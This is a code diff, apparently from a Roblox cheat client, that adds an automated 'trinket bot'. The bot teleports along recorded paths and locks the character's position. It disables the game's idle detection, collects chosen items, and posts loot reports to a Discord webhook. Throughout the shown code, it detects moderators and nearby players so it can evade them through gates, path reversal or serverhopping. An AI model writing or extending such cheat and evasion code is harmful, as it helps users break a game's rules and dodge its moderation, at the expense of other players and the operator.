+                                            if snapcool_conn then snapcool_conn:Disconnect() end
+                                            if danger_conn then danger_conn:Disconnect() end
+
+                                            if not trinket_bot.path_running or emergency_gate_requested then
+                                                break
+                                            end
+                                            library:Notify("SnapCool/Danger cleared - retrying gate")
+                                        end
+                                    end
+                                    task.wait(0.5)
+                                else
+                                    library:Notify(string.format("Gating to %s (point %d/%d)", point.gate_location or "???", i, #trinket_bot.path_points))
+                                end
+
+                                local expected_dest = trinket_bot.path_points[i + 1] and trinket_bot.path_points[i + 1].position or nil
+                                gate_success = Gate(point.gate_location, expected_dest)
+                            end
+
+                            if not gate_success then
+                                library:Notify("Gate failed but staying in server - continuing path")
+                                if utility then
+                                    utility:plain_webhook(string.format("@here Gate to %s repeatedly failing (stay in server mode)", point.gate_location or "???"))
+                                end
+                            else
+                                current_gate_section = current_gate_section + 1
+                            end
+                        end
+                    else
+                        local has_player, player_name = IsPlayerNearPosition(target_point.position, 65)
+                        local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+
+                        if has_player and not stay_in_server and path_has_gates then
+                            library:Notify(string.format("Player %s detected at point %d - checking for gate alternative", player_name, i))
+
+                            local next_gate_point = nil
+                            local next_gate_index = nil
+                            for j = i + 1, #trinket_bot.path_points do
+                                if trinket_bot.path_points[j].is_gate_point then
+                                    local destination_clear = true
+                                    local blocking_player = ""
+
+                                    for k = j + 1, math.min(j + 3, #trinket_bot.path_points) do
+                                        local dest_point = trinket_bot.path_points[k]
+                                        if dest_point then
+                                            local has_player, player_name = IsPlayerNearPosition(dest_point.position, 65)
+                                            if has_player then
+                                                destination_clear = false
+                                                blocking_player = player_name
+                                                break
+                                            end
+                                        end
+                                    end
+
+                                    if destination_clear then
+                                        next_gate_point = trinket_bot.path_points[j]
+                                        next_gate_index = j
+                                        break
+                                    else
+                                        library:Notify(string.format("Player %s near gate %d destination - skipping", blocking_player, j))
+                                    end
+                                end
+                            end
+
+                            if next_gate_point then
+                                emergency_gate_in_progress = true
+                                local gate_success = false
+                                local emergency_retries = 2
+                                local retry_count = 0
+
+                                while not gate_success and retry_count < emergency_retries and trinket_bot.path_running and not emergency_gate_requested and not trinket_bot.moderator_detected do
+                                    retry_count = retry_count + 1
+
+                                    if not trinket_bot.path_running then
+                                        emergency_gate_in_progress = false
+                                        break
+                                    end
+
+                                    if retry_count > 1 then
+                                        library:Notify(string.format("Emergency gate retry %d/%d", retry_count, emergency_retries))
+
+                                        local character = plr.Character
+                                        if character then
+                                            local CollectionService = Services.CollectionService
+                                            local has_snapcool = CollectionService:HasTag(character, "SnapCool")
+                                            local has_danger = cs:HasTag(character, "Danger")
+
+                                            if has_snapcool or has_danger then
+                                                library:Notify("Waiting for SnapCool/Danger to clear before emergency retry...")
+
+                                                local snapcool_cleared = not has_snapcool
+                                                local danger_cleared = not has_danger
+                                                local snapcool_conn, danger_conn
+
+                                                if has_snapcool then
+                                                    snapcool_conn = utility:Connection(CollectionService:GetInstanceRemovedSignal("SnapCool"), function(instance)
+                                                        if instance == character then
+                                                            snapcool_cleared = true
+                                                            if snapcool_conn then snapcool_conn:Disconnect() end
+                                                        end
+                                                    end)
+                                                end
+
+                                                if has_danger then
+                                                    danger_conn = utility:Connection(cs:GetInstanceRemovedSignal("Danger"), function(instance)
+                                                        if instance == character then
+                                                            danger_cleared = true
+                                                            if danger_conn then danger_conn:Disconnect() end
+                                                        end
+                                                    end)
+                                                end
+
+                                                while (not snapcool_cleared or not danger_cleared) and trinket_bot.path_running do
+                                                    task.wait(0.1)
+                                                end
+
+                                                if snapcool_conn then snapcool_conn:Disconnect() end
+                                                if danger_conn then danger_conn:Disconnect() end
+
+                                                if not trinket_bot.path_running then
+                                                    emergency_gate_in_progress = false
+                                                    break
+                                                end
+                                                library:Notify("SnapCool/Danger cleared - retrying emergency gate")
+                                            end
+                                        end
+                                        task.wait(0.5)
+                                    else
+                                        library:Notify(string.format("Using gate to escape player (jumping to point %d)", next_gate_index))
+                                    end
+
+                                    gate_success = Gate(next_gate_point.gate_location)
+                                end
+
+                                if gate_success then
+                                    library:Notify(string.format("Successfully escaped via gate at point %d", next_gate_index))
+                                    current_gate_section = current_gate_section + 1
+                                    proximity_warnings = {}
+
+                                    task.wait(3)
+
+                                    emergency_gate_in_progress = false
+                                    i = next_gate_index + 1
+                                    continue
+                                else
+                                    if not trinket_bot.path_running then
+                                        library:Notify("Bot was manually stopped - aborting serverhop")
+                                        emergency_gate_in_progress = false
+                                        return
+                                    end
+
+                                    local should_serverhop = emergency_path_traverse(plr.Character.HumanoidRootPart.Position, player_name)
+
+                                    if should_serverhop then
+                                        library:Notify(string.format("Emergency gate failed after retries - serverhopping to escape %s", player_name))
+                                        emergency_gate_in_progress = false
+                                        trinket_bot.path_running = false
+                                        TrinketBotServerhop(string.format("Emergency gate failed while escaping %s", player_name))
+                                    else
+                                        emergency_gate_in_progress = false
+                                    end
+                                    return
+                                end
+                            else
+                                if not path_has_gates and plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                    local current_pos = plr.Character.HumanoidRootPart.Position
+                                    local first_point = trinket_bot.path_points[1]
+                                    local last_point = trinket_bot.path_points[#trinket_bot.path_points]
+                                    local dist_to_first = (first_point.position - current_pos).Magnitude
+                                    local dist_to_last = (last_point.position - current_pos).Magnitude
+
+                                    local players_toward_first = 0
+                                    local players_toward_last = 0
+                                    local check_radius = 250
+
+                                    for j = i - 1, 1, -1 do
+                                        local pt = trinket_bot.path_points[j]
+                                        if pt and IsPlayerNearPosition(pt.position, check_radius) then
+                                            players_toward_first = players_toward_first + 1
+                                        end
+                                    end
+                                    for j = i + 1, #trinket_bot.path_points do
+                                        local pt = trinket_bot.path_points[j]
+                                        if pt and IsPlayerNearPosition(pt.position, check_radius) then
+                                            players_toward_last = players_toward_last + 1
+                                        end
+                                    end
+
+                                    local go_to_first
+                                    if players_toward_first ~= players_toward_last then
+                                        go_to_first = players_toward_first < players_toward_last
+                                    else
+                                        go_to_first = dist_to_first <= dist_to_last
+                                    end
+
+                                    local target_index = go_to_first and 1 or #trinket_bot.path_points
+                                    local step = go_to_first and -1 or 1
+
+                                    library:Notify(string.format("No gates - escaping %s toward point %d (%.0f studs, %d players)", player_name, target_index, go_to_first and dist_to_first or dist_to_last, go_to_first and players_toward_first or players_toward_last))
+
+                                    for j = i + step, target_index, step do
+                                        if not trinket_bot.path_running or emergency_gate_requested or trinket_bot.moderator_detected then break end
+                                        local escape_point = trinket_bot.path_points[j]
+                                        if escape_point then
+                                            SmoothTeleport(escape_point.position)
+                                            task.wait(0.3)
+                                        end
+                                    end
+
+                                    emergency_gate_in_progress = false
+                                    trinket_bot.path_running = false
+                                    TrinketBotServerhop(string.format("Escaped %s via path traversal (no gates)", player_name))
+                                    return
+                                else
+                                    library:Notify(string.format("No clear gate point available - serverhopping to escape %s", player_name))
+                                    emergency_gate_in_progress = false
+                                    trinket_bot.path_running = false
+                                    TrinketBotServerhop(string.format("No gate available to escape %s", player_name))
+                                    return
+                                end
+                            end
+                        else
+                            local shrieker_found, shrieker_name, shrieker_dist = detect_shrieker_near_position(target_point.position, 65)
+
+                            if shrieker_found then
+                                library:Notify(string.format("!! SHRIEKER detected near point %d (%.0f studs) !!", i, shrieker_dist))
+
+                                if not path_has_gates then
+                                    library:Notify("Non-gate path - traversing back to point 1 for safety")
+
+                                    for reverse_i = i - 1, 1, -1 do
+                                        if not trinket_bot.path_running then break end
+                                        local reverse_point = trinket_bot.path_points[reverse_i]
+                                        if reverse_point then
+                                            SmoothTeleport(reverse_point.position)
+                                            task.wait(0.3)
+                                        end
+                                    end
+
+                                    trinket_bot.path_running = false
+                                    TrinketBotServerhop(string.format("Shrieker detected near point %d - returned to point 1", i))
+                                    return
+                                else
+                                    local next_gate_point = nil
+                                    local next_gate_index = nil
+                                    for j = i + 1, #trinket_bot.path_points do
+                                        if trinket_bot.path_points[j].is_gate_point then
+                                            next_gate_point = trinket_bot.path_points[j]
+                                            next_gate_index = j
+                                            break
+                                        end
+                                    end
+
+                                    if next_gate_point then
+                                        library:Notify(string.format("Gate path - gating to point %d to escape Shrieker", next_gate_index))
+                                        if utility then
+                                            utility:plain_webhook(string.format("Shrieker detected near point %d - gating to point %d to escape", i, next_gate_index))
+                                        end
+                                        local gate_success = Gate(next_gate_point.gate_location)
+                                        if gate_success then
+                                            i = next_gate_index + 1
+                                            continue
+                                        else
+                                            library:Notify("Gate failed during Shrieker escape - serverhopping")
+                                            trinket_bot.path_running = false
+                                            TrinketBotServerhop(string.format("Shrieker at point %d, gate escape failed", i))
+                                            return
+                                        end
+                                    else
+                                        library:Notify("No more gate points to escape Shrieker - serverhopping")
+                                        trinket_bot.path_running = false
+                                        TrinketBotServerhop(string.format("Shrieker at point %d, no gate available", i))
+                                        return
+                                    end
+                                end
+                            else
+                                library:Notify(string.format("Moving to point %d/%d", i, #trinket_bot.path_points))
+                                SmoothTeleport(target_point.position)
+                            end
+                        end
+                    end
+
+                    if not skip_current_point then
+                        if point.wait_time and point.wait_time > 0 then
+                            local start_time = tick()
+                            while tick() - start_time < point.wait_time and trinket_bot.path_running and not shared.is_unloading and not emergency_gate_requested and not trinket_bot.moderator_detected do
+                                task.wait(0.5)
+                            end
+                        end
+
+                        if trinket_bot.original_point_1_position then
+                            local dist_to_original_p1 = (point.position - trinket_bot.original_point_1_position).Magnitude
+                            if dist_to_original_p1 < 5 and i > 1 then
+                                TrinketBotServerhop("back to point 1!!!")
+                                return
+                            end
+                        end
+
+                        if point.wait_for_trinket then
+                            local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+                            if not stay_in_server then
+                                for _, other_player in next, plrs:GetPlayers() do
+                                    if other_player ~= plr and other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                                        local player_distance = (other_player.Character.HumanoidRootPart.Position - point.position).Magnitude
+                                        if player_distance <= 150 then
+                                            library:Notify(string.format("Player %s at trinket check point %d! Serverhopping...", other_player.Name, i))
+                                            TrinketBotServerhop(string.format("Player %s at trinket check point %d", other_player.Name, i))
+                                            return
+                                        end
+                                    end
+                                end
+                            end
+
+                            local wait_point_count = 0
+                            local current_wait_index = 0
+                            for idx, p in ipairs(trinket_bot.path_points) do
+                                if p.wait_for_trinket then
+                                    wait_point_count = wait_point_count + 1
+                                    if idx <= i then
+                                        current_wait_index = wait_point_count
+                                    end
+                                end
+                            end
+
+                            local is_last_wait_point = (current_wait_index == wait_point_count)
+                            if is_last_wait_point then
+                                library:Notify(string.format("Waiting at point %d", i))
+                            else
+                                library:Notify(string.format("Waiting at point %d (%d/%d wait points)", i, current_wait_index, wait_point_count))
+                            end
+
+                            local disabled_noclip = false
+                            if plr.Character then
+                                local huma = FindFirstChildOfClass(plr.Character, "Humanoid")
+                                if huma then
+                                    local isInAir = huma.FloorMaterial == Enum.Material.Air
+                                    if not isInAir then
+                                        huma:SetStateEnabled(5, true)
+                                        huma:ChangeState(5)
+                                        disabled_noclip = true
+                                    end
+                                end
+                            end
+
+                            if plr.Character then
+                                local huma = FindFirstChildOfClass(plr.Character, "Humanoid")
+                                if huma and huma.FloorMaterial == Enum.Material.Air then
+                                    local lock_position = point.position
+                                    position_lock_connection = track_connection("position_lock", utility:Connection(rs.RenderStepped, LPH_NO_VIRTUALIZE(function()
+                                        if not trinket_bot.path_running or shared.is_unloading then
+                                            if position_lock_connection then
+                                                position_lock_connection:Disconnect()
+                                                position_lock_connection = nil
+                                            end
+                                            return
+                                        end
+
+                                        local root = plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart")
+                                        if root then
+                                            root.CFrame = CFrame.new(lock_position)
+                                            root.AssemblyLinearVelocity = Vector3.new()
+                                        end
+                                    end)))
+                                end
+                            end
+
+                            local wait_start = tick()
+                            local wait_duration = 8.67
+
+                            if is_last_wait_point then
+                                local should_collect = false
+                                temp_connection = track_connection("temp_ws_child", utility:Connection(ws.ChildAdded, function(object)
+                                    if not trinket_bot.path_running or not plr.Character or not FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                        return
+                                    end
+
+                                    local root = plr.Character.HumanoidRootPart
+                                    if object.Name == "Part" and FindFirstChild(object, "ID") then
+                                        local trinketName, trinketColor, trinketZIndex = cheat_client:identify_trinket(object)
+                                        local ignore_ice = not (Toggles.PickupIceEssence and Toggles.PickupIceEssence.Value)
+                                        local ignore_scrolls = not (Toggles.PickupScrolls and Toggles.PickupScrolls.Value)
+                                        local selected_mythics_artifacts = Options.PickupMythicsArtifacts and Options.PickupMythicsArtifacts.Value or {}
+                                        local pickup_trinkets = Toggles.PickupTrinkets and Toggles.PickupTrinkets.Value
+                                        local pickup_event_items = Toggles.PickupEventItems and Toggles.PickupEventItems.Value
+
+                                        local should_pickup = true
+
+                                        if (trinketName == "Azael Horn" or trinketName == "Phoenix Down" or trinketName == "Phoenix Flower") then
+                                            should_pickup = selected_mythics_artifacts[trinketName] == true
+                                        elseif (ignore_ice and trinketName == "Ice Essence") then
+                                            should_pickup = false
+                                        elseif (ignore_scrolls and trinketName == "Scroll") then
+                                            should_pickup = false
+                                        else
+                                            local is_common = trinketColor == cheat_client.trinket_colors.common.Color
+                                            local is_rare = trinketColor == cheat_client.trinket_colors.rare.Color
+                                            local is_mythic = trinketColor == cheat_client.trinket_colors.mythic.Color
+                                            local is_artifact = trinketColor == cheat_client.trinket_colors.artifact.Color
+                                            local is_event = trinketColor == cheat_client.trinket_colors.event.Color
+
+                                            if is_mythic or is_artifact then
+                                                should_pickup = selected_mythics_artifacts[trinketName] == true
+                                            elseif is_event then
+                                                should_pickup = pickup_event_items
+                                            elseif is_common or is_rare then
+                                                should_pickup = pickup_trinkets
+                                            end
+                                        end
+
+                                        if should_pickup then
+                                            local distance = (object.Position - root.Position).Magnitude
+                                            if distance <= 100 then
+                                                should_collect = true
+                                            end
+                                        end
+                                    end
+                                end))
+
+                                while tick() - wait_start < wait_duration and not should_collect and trinket_bot.path_running and not emergency_gate_requested and not trinket_bot.moderator_detected do
+                                    task.wait(0.1)
+                                end
+
+                                if should_collect and trinket_bot.path_running then
+                                    task.wait(1.46)
+                                end
+
+                                if temp_connection then
+                                    temp_connection:Disconnect()
+                                end
+                            else
+                                local wait_elapsed = 0
+                                while wait_elapsed < wait_duration and trinket_bot.path_running and not emergency_gate_requested and not trinket_bot.moderator_detected do
+                                    task.wait(0.5)
+                                    wait_elapsed = wait_elapsed + 0.5
+                                end
+                            end
+
+                            if position_lock_connection then
+                                position_lock_connection:Disconnect()
+                                position_lock_connection = nil
+                            end
+
+                            if disabled_noclip and plr.Character then
+                                local huma = FindFirstChildOfClass(plr.Character, "Humanoid")
+                                if huma then
+                                    huma:SetStateEnabled(5, false)
+                                    huma:ChangeState(3)
+                                end
+                            end
+
+                            local is_tundra2_danger = false
+
+                            local tundra2_center = Vector3.new(3988, 439, -954)
+                            local dist_to_tundra2 = (point.position - tundra2_center).Magnitude
+                            if dist_to_tundra2 <= 150 then
+                                local monsterSpawns = ws:FindFirstChild("MonsterSpawns")
+                                if monsterSpawns then
+                                    local groups = FindFirstChild(monsterSpawns, "Groups")
+                                    if groups then
+                                        local mazeSnakes = FindFirstChild(groups, "MazeSnakes")
+                                        if mazeSnakes then
+                                            local terraSerpent = FindFirstChild(mazeSnakes, "Terra Serpent")
+                                            if terraSerpent then
+                                                local spawned = FindFirstChild(terraSerpent, "Spawned")
+                                                if spawned and spawned:IsA("BoolValue") and spawned.Value == true then
+                                                    is_tundra2_danger = true
+                                                    warn("terra serpent spawned in tundra 2 area so am scanning only and will teleport to safe position")
+                                                end
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+
+                            local is_ice_dragon_near = false
+                            local ice_dragon_dist = 0
+                            local iceDragon = ws:FindFirstChild("Ice Dragon")
+                            if iceDragon then
+                                local iceDragonRoot = FindFirstChild(iceDragon, "HumanoidRootPart")
+                                if iceDragonRoot then
+                                    ice_dragon_dist = (iceDragonRoot.Position - point.position).Magnitude
+                                    if ice_dragon_dist <= 200 then
+                                        is_ice_dragon_near = true
+                                        library:Notify(string.format("!! ICE DRAGON near wait point (%.0f studs) - skipping trinket loot !!", ice_dragon_dist))
+                                    end
+                                end
+                            end
+
+                            local should_skip_trinkets = false
+                            local has_danger_tag = plr.Character and cs:HasTag(plr.Character, "Danger")
+
+                            if has_danger_tag then
+                                local player_within_400 = false
+                                local near_tundra_danger = false
+
+                                if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                    local bot_pos = plr.Character.HumanoidRootPart.Position
+                                    for _, other_player in next, plrs:GetPlayers() do
+                                        if other_player ~= plr and other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                                            local distance = (other_player.Character.HumanoidRootPart.Position - bot_pos).Magnitude
+                                            if distance <= 400 then
+                                                player_within_400 = true
+                                                break
+                                            end
+                                        end
+                                    end
+                                end
+
+                                near_tundra_danger = is_tundra2_danger
+
+                                if player_within_400 or near_tundra_danger then
+                                    should_skip_trinkets = true
+                                    warn("bot is in danger with plr nearby or is in tundra danger area so am gonna skip trinket collection")
+                                else
+                                    warn("bot is in danger but no plr within 400 studs and not in tundra danger area so am collecting trinkets")
+                                end
+                            end
+
+                            if is_ice_dragon_near then
+                                warn(string.format("skipping trinket collection - Ice Dragon within %.0f studs of wait point", ice_dragon_dist))
+                            elseif should_skip_trinkets then
+                                warn("skipping trinket collection due to danger")
+                            elseif is_tundra2_danger then
+                                ScanTrinketsOnly()
+                            else
+                                CheckForTrinkets()
+                            end
+
+                            if is_tundra2_danger then
+                                local safe_position = Vector3.new(3981, 612, -1058)
+                                warn("teleporting to safe tundra 2 position: " .. tostring(safe_position))
+                                SmoothTeleport(safe_position)
+                            end
+
+                            completed_wait_point = true
+                        end
+                    end
+
+                    if i < #trinket_bot.path_points and not path_has_gates then
+                        local next_point = trinket_bot.path_points[i + 1]
+                        if next_point then
+                            local has_player, player_name = IsPlayerNearPosition(next_point.position, 65)
+                            local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+
+                            if has_player and not stay_in_server then
+                                local is_test_mode = Options.TestPath and Options.TestPath.Value or false
+
+                                library:Notify(string.format("Player %s blocking point %d - reversing to point 1 and serverhopping", player_name, i + 1))
+
+                                for reverse_i = i, 1, -1 do
+                                     if not trinket_bot.path_running then break end
+                                    local reverse_point = trinket_bot.path_points[reverse_i]
+                                    if reverse_point then
+                                        SmoothTeleport(reverse_point.position)
+                                    end
+                                end
+
+                                TrinketBotServerhop(string.format("Player %s blocking path so i traversed back to point 1!!", player_name))
+                                return
+                            end
+                        end
+                    end
+
+                    i = i + 1
+                end
+
+                if kick_after_path then
+                    library:Notify(string.format("Reached last point! Kicking for %s...", kick_trinket_name))
+                    utility:plain_webhook(string.format("@here Reached last point after picking up %s - Kicking now", kick_trinket_name))
+                    task.wait(0.5)
+                    plr:Kick(string.format("%s picked up (completed path to last point)", kick_trinket_name))
+                    return
+                end
+
+                if auto_trinket_connection then
+                    auto_trinket_connection:Disconnect()
+                end
+                if trinket_added_connection then
+                    trinket_added_connection:Disconnect()
+                end
+                if proximity_connection then
+                    proximity_connection:Disconnect()
+                end
+                for _, conn in next, gnav_connections do
+                    if conn then
+                        pcall(function() conn:Disconnect() end)
+                    end
+                end
+                trinket_bot.gnav_connections = {}
+                if emergency_serverhop_connection then
+                    pcall(function() emergency_serverhop_connection:Disconnect() end)
+                end
+                if mod_connection then
+                    pcall(function() mod_connection:Disconnect() end)
+                end
+                if glassmask_connection then
+                    pcall(function() glassmask_connection:Disconnect() end)
+                end
+                if glassmask_thrown_connection then
+                    pcall(function() glassmask_thrown_connection:Disconnect() end)
+                end
+                if death_connection then
+                    pcall(function() death_connection:Disconnect() end)
+                end
+                for _, conn in ipairs(illu_connections) do
+                    if conn then
+                        pcall(function() conn:Disconnect() end)
+                    end
+                end
+                trinket_bot.illu_connections = {}
+                if loot_tracking_connection then
+                    pcall(function() loot_tracking_connection:Disconnect() end)
+                    loot_tracking_connection = nil
+                end
+                for _, conn in ipairs(quantity_connections) do
+                    if conn then
+                        pcall(function() conn:Disconnect() end)
+                    end
+                end
+                quantity_connections = {}
+                if position_lock_connection then
+                    pcall(function() position_lock_connection:Disconnect() end)
+                    position_lock_connection = nil
+                end
+                if temp_connection then
+                    pcall(function() temp_connection:Disconnect() end)
+                    temp_connection = nil
+                end
+
+
+                for brick, _ in pairs(affected_bricks) do
+                    if brick and brick.Parent then
+                        brick.CanTouch = true
+                    end
+                end
+
+                restore_bot_state()
+
+                if not test_mode then
+                    for _, connection in next, getconnections(plr.Idled) do
+                        connection:Enable()
+                    end
+                end
+
+                if not test_mode and not mem:HasItem("botstarted") then
+                    trinket_bot.path_running = false
+                    library:Notify("Bot stopped")
+                    return
+                end
+
+                if not test_mode then
+                    local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+
+                    if stay_in_server then
+                        library:Notify("Path completed! Waiting at current position...")
+
+                        local run_number = (mem:HasItem("stay_in_server_runs") and tonumber(mem:GetItem("stay_in_server_runs")) or 0) + 1
+                        mem:SetItem("stay_in_server_runs", tostring(run_number))
+
+                        local serverName, serverRegion = get_server_info()
+                        local elapsed_time = os.clock() - trinket_bot.session_start_time
+                        local hours = math.floor(elapsed_time / 3600)
+                        local minutes = math.floor((elapsed_time % 3600) / 60)
+                        local seconds = math.floor(elapsed_time % 60)
+
+                        local items_text = ""
+                        if trinket_bot.session_loot and next(trinket_bot.session_loot) then
+                            local items = {}
+                            for item_name, count in pairs(trinket_bot.session_loot) do
+                                table.insert(items, {name = item_name, count = count})
+                            end
+                            table.sort(items, function(a, b) return a.count > b.count end)
+                            for _, item in ipairs(items) do
+                                items_text = items_text .. string.format("%dx %s\n", item.count, item.name)
+                            end
+                        else
+                            items_text = "No items collected"
+                        end
+
+                        local player_count = #plrs:GetPlayers()
+                        local footer_text
+                        if cheat_client.config.webhook_show_username ~= false then
+                            footer_text = string.format("Players: %d/23 | %s | Job: %s", player_count, plr.Name, game.JobId)
+                        else
+                            footer_text = string.format("Players: %d/23 | Job: %s", player_count, game.JobId)
+                        end
+
+                        local description = string.format(
+                            "**Server:** `%s (%s)`\n**Inventory Value:** %d\n**Session:** %dh %dm %ds",
+                            serverName ~= "" and serverName or "Unknown",
+                            serverRegion ~= "" and serverRegion or "Unknown",
+                            get_inventory_value(),
+                            hours, minutes, seconds
+                        )
+
+                        local embed = {
+                            title = string.format("Stay In Server - Run #%d", run_number),
+                            description = description,
+                            color = 0x5865F2,
+                            fields = {
+                                {
+                                    name = "Items Collected",
+                                    value = string.format("```\n%s```", items_text),
+                                    inline = false
+                                }
+                            },
+                            footer = {
+                                text = footer_text
+                            },
+                            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                        }
+
+                        if cheat_client.config.webhook and cheat_client.config.webhook ~= "" then
+                            task.spawn(function()
+                                pcall(function()
+                                    HXD_SEND_WEBHOOK(cheat_client.config.webhook, {
+                                        username = cheat_client.config.webhook_username or "bladee",
+                                        embeds = {embed}
+                                    })
+                                end)
+                            end)
+                        end
+
+                        trinket_bot.session_loot = {}
+                        trinket_bot.session_start_time = os.clock()
+                        visited_positions = {}
+                        collected_trinket_ids = {}
+                        trinket_bot.pending_pickup_ids = {}
+                        pending_pickup_ids = trinket_bot.pending_pickup_ids
+
+                        local wait_time_minutes = Options.TimeBetweenLooting and Options.TimeBetweenLooting.Value or 5
+                        local wait_time_seconds = wait_time_minutes * 60
+
+                        library:Notify(string.format("Waiting %d minutes before restarting path...", wait_time_minutes))
+
+                        for i = 1, wait_time_seconds do
+                            if not trinket_bot.path_running or not (mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true") then
+                                library:Notify("Bot stopped during wait period")
+                                return
+                            end
+                            task.wait(1)
+                        end
+
+                        if not trinket_bot.path_running or not (mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true") then
+                            library:Notify("Bot stopped before path restart")
+                            return
+                        end
+
+                        library:Notify("Restarting path...")
+                        task.wait(1)
+                        trinket_bot.path_running = false
+                        ExecutePath(false)
+                    else
+                        library:Notify("Path completed! Serverhopping...")
+                        task.wait(0.5)
+                        if not critical_serverhop_sent then
+                            TrinketBotServerhop("Server farmed, serverhopping")
+                        else
+                            TrinketBotServerhop("Server farmed after critical event, serverhopping")
+                        end
+                        trinket_bot.path_running = false
+                    end
+                else
+                    trinket_bot.path_running = false
+                    library:Notify("Test path completed!")
+
+                    local serverName, serverRegion = get_server_info()
+                    local elapsed_time = os.clock() - trinket_bot.session_start_time
+                    local hours = math.floor(elapsed_time / 3600)
+                    local minutes = math.floor((elapsed_time % 3600) / 60)
+                    local seconds = math.floor(elapsed_time % 60)
+
+                    local items_text = ""
+                    if trinket_bot.session_loot and next(trinket_bot.session_loot) then
+                        local items = {}
+                        for item_name, count in pairs(trinket_bot.session_loot) do
+                            table.insert(items, {name = item_name, count = count})
+                        end
+                        table.sort(items, function(a, b) return a.count > b.count end)
+                        for _, item in ipairs(items) do
+                            items_text = items_text .. string.format("%dx %s\n", item.count, item.name)
+                        end
+                    else
+                        items_text = "No items collected"
+                    end
+
+                    local player_count = #plrs:GetPlayers()
+                    local footer_text
+                    if cheat_client.config.webhook_show_username ~= false then
+                        footer_text = string.format("Players: %d/23 | %s | Job: %s", player_count, plr.Name, game.JobId)
+                    else
+                        footer_text = string.format("Players: %d/23 | Job: %s", player_count, game.JobId)
+                    end
+
+                    local description = string.format(
+                        "**Server:** `%s (%s)`\n**Inventory Value:** %d\n**Session:** %dh %dm %ds",
+                        serverName ~= "" and serverName or "Unknown",
+                        serverRegion ~= "" and serverRegion or "Unknown",
+                        get_inventory_value(),
+                        hours, minutes, seconds
+                    )
+
+                    local embed = {
+                        title = "Test Run Completed",
+                        description = description,
+                        color = 0x00FF00,
+                        fields = {
+                            {
+                                name = "Items Collected",
+                                value = string.format("```\n%s```", items_text),
+                                inline = false
+                            }
+                        },
+                        footer = {
+                            text = footer_text
+                        },
+                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                    }
+
+                    if cheat_client.config.webhook and cheat_client.config.webhook ~= "" then
+                        task.spawn(function()
+                            pcall(function()
+                                HXD_SEND_WEBHOOK(cheat_client.config.webhook, {
+                                    username = cheat_client.config.webhook_username or "bladee",
+                                    embeds = {embed}
+                                })
+                            end)
+                        end)
+                    end
+                end
+            end
+
+            local group_trinket_bot = Tabs.Botting:AddLeftGroupbox("Trinket Bot")
+
+            group_trinket_bot:AddInput("PointWaitTime", {
+                Default = "0",
+                Numeric = true,
+                Finished = false,
+                Text = "Point Wait Time (seconds)",
+                Tooltip = "Time to wait at each new point (0 = no wait)",
+                Placeholder = "0"
+            })
+
+            group_trinket_bot:AddButton({
+                Text = "Create Point",
+                Func = function()
+                    if not plr.Character or not FindFirstChild(plr.Character, "HumanoidRootPart") then
+                        library:Notify("Character not found!")
+                        return
+                    end
+
+                    local position = plr.Character.HumanoidRootPart.Position
+                    local wait_time = tonumber(Options.PointWaitTime and Options.PointWaitTime.Value or "0") or 0
+                    table.insert(trinket_bot.path_points, {
+                        position = position,
+                        wait_for_trinket = false,
+                        wait_time = wait_time
+                    })
+
+                    if wait_time > 0 then
+                        library:Notify(string.format("Created point %d (wait: %ds)", #trinket_bot.path_points, wait_time))
+                    else
+                        library:Notify(string.format("Created point %d at current position", #trinket_bot.path_points))
+                    end
+                    update_visualizations()
+                end
+            })
+
+            group_trinket_bot:AddLabel("Create Point Keybind"):AddKeyPicker("CreatePointKeybind", {
+                Default = "None",
+                Text = "Create Point",
+                Mode = "Press",
+                Callback = function()
+                    if not plr.Character or not FindFirstChild(plr.Character, "HumanoidRootPart") then
+                        library:Notify("Character not found!")
+                        return
+                    end
+
+                    local position = plr.Character.HumanoidRootPart.Position
+                    local wait_time = tonumber(Options.PointWaitTime and Options.PointWaitTime.Value or "0") or 0
+                    table.insert(trinket_bot.path_points, {
+                        position = position,
+                        wait_for_trinket = false,
+                        wait_time = wait_time
+                    })
+
+                    if wait_time > 0 then
+                        library:Notify(string.format("Created point %d (wait: %ds)", #trinket_bot.path_points, wait_time))
+                    else
+                        library:Notify(string.format("Created point %d at current position", #trinket_bot.path_points))
+                    end
+                    update_visualizations()
+                end
+            })
+
+            group_trinket_bot:AddButton({
+                Text = "Undo Point",
+                Func = function()
+                    if #trinket_bot.path_points == 0 then
+                        library:Notify("No points to undo!")
+                        return
+                    end
+
+                    table.remove(trinket_bot.path_points)
+                    library:Notify(string.format("Removed last point. %d points remaining", #trinket_bot.path_points))
+                    update_visualizations()
+                end
+            })
+
+            group_trinket_bot:AddButton({
+                Text = "Set Wait For Trinket",
+                Func = function()
+                    if not plr.Character or not FindFirstChild(plr.Character, "HumanoidRootPart") then
+                        library:Notify("Character not found!")
+                        return
+                    end
+
+                    local position = plr.Character.HumanoidRootPart.Position
+                    local wait_time = tonumber(Options.PointWaitTime and Options.PointWaitTime.Value or "0") or 0
+                    table.insert(trinket_bot.path_points, {
+                        position = position,
+                        wait_for_trinket = true,
+                        wait_time = wait_time
+                    })
+
+                    if wait_time > 0 then
+                        library:Notify(string.format("Created wait point %d (wait: %ds)", #trinket_bot.path_points, wait_time))
+                    else
+                        library:Notify(string.format("Created wait point %d at current position", #trinket_bot.path_points))
+                    end
+                    update_visualizations()
+                end
+            })
+
+            group_trinket_bot:AddButton({
+                Text = "Clear Points",
+                DoubleClick = true,
+                Func = function()
+                    trinket_bot.path_points = {}
+                    library:Notify("Cleared all points")
+                    if update_visualizations then
+                        update_visualizations()
+                    end
+                end
+            })
+
+            group_trinket_bot:AddDivider()
+
+            group_trinket_bot:AddInput("GateLocation", {
+                Default = "",
+                Numeric = false,
+                Finished = false,
+                Text = "Gate Location",
